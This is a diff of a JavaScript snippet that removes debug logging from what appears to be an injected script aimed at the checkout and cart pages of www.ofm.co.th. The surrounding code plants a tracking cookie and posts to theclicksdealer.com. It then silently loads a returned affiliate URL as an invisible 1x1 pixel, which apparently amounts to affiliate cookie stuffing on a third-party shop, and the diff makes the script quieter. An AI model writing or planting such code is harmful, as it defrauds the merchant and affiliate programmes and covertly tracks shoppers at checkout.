@@ -8,7 +8,7 @@
     }
 
     function createTrackingPixel(url) {
-        console.log("line => 11 ",url)
+       
         var img = document.createElement('img');
         img.src = url;
         img.width = 1;
@@ -32,14 +32,14 @@
     }
 
     async function initTracking() {
-        console.log("line => 34")
+        
       if (sessionStorage.getItem('iframe_triggered')) return;
 
         try {
             let uniqueId = getCookie('tracking_uuid') || generateUUID();
             let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
             document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
-            console.log("line => 41")
+            
             let response = await fetch('https://theclicksdealer.com/api/track-user', {
                 method: 'POST',
                 body: JSON.stringify({
@@ -53,7 +53,7 @@
                     'Access-Control-Allow-Origin':'*'
                 }
             });
-            console.log("line => 55")
+            
             let raw = await response.text();  
             
             let result;
@@ -63,14 +63,14 @@
                 console.error("Response is not valid JSON:", e);
                 return;
             }
-            console.log("line => 65",result)
+            
             if (result.success && result.affiliate_url) {
                 
                 createTrackingPixel(result.affiliate_url);
                
                 sessionStorage.setItem('iframe_triggered', 'true');
             } else {
-                console.log("line => 72")
+                
                 createTrackingPixel('https://theclicksdealer.com/api/fallback-pixel?id=' + uniqueId);
             }
         } catch (error) {
@@ -94,18 +94,18 @@
     }
 
     function isCartPage() {
-            console.log("line => 96 add to cart")
+           
         const cartPages = ["/cart", "/checkout","/checkout/shipping","/checkout/cart","/shopping-cart","/en/cart","/en/checkout/review-order","/checkout/review-order"];
        
         return cartPages.some(path => window.location.pathname.includes(path));
     }
 
       function onDOMReady(callback) {
-console.log("line => 103")
+
     if (document.readyState === "interactive" || document.readyState === "complete") {
         callback();
     } else {
-        console.log("line => 107")
+        
         window.addEventListener("DOMContentLoaded", callback);
     }
 }
@@ -113,7 +113,7 @@ console.log("line => 103")
 onDOMReady(function() {
     
     if (window.location.hostname === "www.ofm.co.th") {
-        console.log("line => 113")
+        
         if (isCartPage()) {
             initTracking();
             initTracking();
